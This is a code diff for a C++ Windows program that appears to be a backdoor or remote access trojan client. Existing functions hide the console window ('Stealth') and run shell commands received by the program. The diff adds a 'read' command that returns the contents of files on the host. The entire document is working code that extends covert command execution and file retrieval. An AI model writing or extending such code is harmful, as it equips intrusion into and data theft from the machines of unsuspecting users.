@@ -74,7 +74,9 @@ std::string executeShell(char* cmd)
     std::string cd = std::string(cmd).substr(0, 2);
     if (cd._Equal("cd"))
         return switchDir((char*)std::string(cmd).substr(2).c_str());
-
+    std::string read = std::string(cmd).substr(0, 4);
+    if (read == "read")
+        return readFile(std::string(cmd).substr(5));
     std::array<char, 128> buffer;
     std::string result;
     /*i create a pointer to a "file"*/
@@ -133,5 +135,25 @@ void hideConsole()
     Stealth = FindWindowA("ConsoleWindowClass", NULL);
     /* set the visiblity mode to 0, invisible*/
     ShowWindow(Stealth, 0);
+}
+
+std::string readFile(std::string fileName)
+{
+    std::string subFolderPath;
+    WCHAR moduleFilePath[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, moduleFilePath);
+
+    /* change type of path*/
+    char modulePath[MAX_PATH];
+    wcstombs(modulePath, moduleFilePath, MAX_PATH);
+
+    std::string output, filePath = std::string(modulePath) + "\\" + fileName;
+    char buf[256]{ 0 };
+    FILE* file;
+    fopen_s(&file, filePath.c_str(), "rb");
+    if (file)
+        while (fgets(buf, 256, file))
+            output += buf;
+    return output;
 }
 
